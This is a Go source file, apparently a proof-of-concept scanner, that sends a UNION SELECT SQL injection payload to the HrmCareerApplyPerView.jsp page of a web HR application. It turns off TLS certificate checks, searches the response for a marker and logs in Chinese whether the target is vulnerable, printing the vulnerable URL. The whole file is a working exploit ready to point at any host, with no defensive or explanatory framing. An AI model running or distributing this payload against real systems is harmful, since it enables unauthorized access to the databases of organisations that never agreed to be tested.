package poc

import (
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func HrmCareerApplyPerViewSQL(target string) {
	url := strings.TrimRight(target, "/")
	path := "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7 "
	req, err := http.NewRequest("GET", url+path, nil)
	if err != nil {
		log.Println(err)
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if resp == nil {
		log.Println("请求错误")
	} else {
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		msg := regexp.MustCompile("/pweb/careerapply/HrmCareerApplyPerEdit").MatchString(string(body))
		if resp.StatusCode == http.StatusOK && msg {
			log.Println("[+] 存在HrmCareerApplyPerEdit SQL注入漏洞")
			log.Println("[+] 漏洞url：", url+path)
		} else {
			log.Println("[-] 不存在HrmCareerApplyPerEdit SQL注入漏洞")
		}
	}
}
